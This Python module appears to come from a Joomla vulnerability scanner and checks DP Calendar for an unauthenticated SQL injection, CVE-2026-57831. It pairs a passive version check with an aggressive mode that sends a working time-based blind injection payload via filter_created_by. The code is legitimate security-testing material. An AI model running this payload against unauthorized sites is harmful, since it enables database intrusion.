from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlencode

from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-57831"
NAME = "DP Calendar unauthenticated events author SQL injection"
COMPONENT = "DP Calendar"
AFFECTED_RULE = "DP Calendar 8.18.0 through 10.11.1; fixed in 10.11.2"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["safe", "aggressive"]
EVENTS_PATH = "/index.php"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
DEFAULT_AUTHOR_ID = 1
DEFAULT_DELAY = 3
SLEEP_THRESHOLD = 1.2


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("10.11.2")
    first_affected = parse_version_safe("8.18.0")
    if parsed is None or fixed is None or first_affected is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < first_affected:
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("dpcalendar", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="DP Calendar was not detected through its manifest or component route.", action="No action is required unless DP Calendar is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected DP Calendar {version}, within the affected range below 10.11.2. The public events model accepts filter_created_by as a scalar and interpolates it into an IN clause."
        action = "Upgrade DP Calendar to 10.11.2 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected DP Calendar {version}, which casts the author filter to integers before building the IN clause."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "DP Calendar was detected, but its version could not be determined."
        action = "Determine the installed DP Calendar version and upgrade to 10.11.2 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _events_url(base: str, author: str) -> str:
    return f"{base}{EVENTS_PATH}?{urlencode({'option': 'com_dpcalendar', 'view': 'events', 'format': 'raw', 'filter_created_by': author})}"


def _timed_get(client: HttpClient, url: str, timeout: int) -> tuple[dict[str, Any], float]:
    started = time.monotonic()
    response = client.request(url, method="GET", headers={"User-Agent": BROWSER_UA}, timeout=timeout)
    return response, time.monotonic() - started


def run_aggressive_probe(
    target_url: str,
    author_id: int = DEFAULT_AUTHOR_ID,
    delay: int = DEFAULT_DELAY,
    timeout: int = 15,
    proxy: str | None = None,
) -> Finding:
    """Time-based blind SQL injection through the public events feed.

    DP Calendar 10.11.1 builds ``(a.created_by in (<filter_created_by>))``
    from the raw request value. The payload closes the IN list and the
    surrounding WHERE group, appends ``AND (SELECT SLEEP(n))`` and comments
    the remaining parentheses. 10.11.2 runs ``ArrayHelper::toInteger`` first.
    The probe needs at least one public event so the WHERE clause is evaluated.
    """
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    control_url = _events_url(base, str(author_id))
    payload = f"{author_id}) AND (SELECT SLEEP({delay})))-- -"
    proof_url = _events_url(base, payload)

    control, control_elapsed = _timed_get(client, control_url, timeout)
    if is_transport_error(control):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=control_url, detail=f"The control request failed in transit ({transport_error_detail(control)}).", action="Retry when the target is reachable.")
    proof, proof_elapsed = _timed_get(client, proof_url, timeout)
    if is_transport_error(proof):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=proof_url, detail=f"The SQL injection request failed in transit ({transport_error_detail(proof)}).", action="Retry when the target is reachable.")

    delta = proof_elapsed - control_elapsed
    delayed = proof_elapsed >= delay * 0.8 and delta >= SLEEP_THRESHOLD
    evidence = {
        "author_id": author_id,
        "delay_seconds": delay,
        "control_status": control.get("status"),
        "control_seconds": round(control_elapsed, 3),
        "proof_status": proof.get("status"),
        "proof_seconds": round(proof_elapsed, 3),
        "delta_seconds": round(delta, 3),
        "delayed": delayed,
    }
    if delayed:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{EVENTS_PATH}",
            evidence=evidence,
            detail=(
                "The public events feed evaluated a SLEEP() payload from filter_created_by. The control request "
                "returned in normal time and the injection added a measurable delay, confirming blind SQL injection "
                "without extracting data."
            ),
            action="Upgrade DP Calendar to 10.11.2 or newer.",
        )
    status = "BLOCKED_EXTERNAL" if control.get("status") in (401, 403) or proof.get("status") in (401, 403) else "NOT_CONFIRMED"
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=status,
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{EVENTS_PATH}",
        evidence=evidence,
        detail=(
            "The injection did not add a delay. 10.11.2 casts the author filter to integers, or the target has no "
            "public event in the requested window, so the WHERE clause was never evaluated."
        ),
        action="Upgrade affected DP Calendar versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}/index.php?option=com_dpcalendar"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The DP Calendar page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The DP Calendar page is reachable; the events SQL injection payload was not sent in safe mode.", action="Use aggressive mode with a public event on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 15, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because DP Calendar was not detected as potentially affected."
            return passive
        author_value = aggressive_value(aggressive_args, aggressive_command, "author_id")
        author_id = int(author_value) if author_value and author_value.isdigit() else DEFAULT_AUTHOR_ID
        delay_value = aggressive_value(aggressive_args, aggressive_command, "delay")
        delay = int(delay_value) if delay_value and delay_value.isdigit() else DEFAULT_DELAY
        result = run_aggressive_probe(
            target_url,
            author_id=author_id,
            delay=delay,
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (DP Calendar reachability) and aggressive (time-based events author SQL injection) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-18", "updated": "2026-11-18", "required_detectors": ["dpcalendar"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-57831", "https://joomla.digital-peak.com/products/dpcalendar", "https://github.com/Digital-Peak/DPCalendar-Free"]}
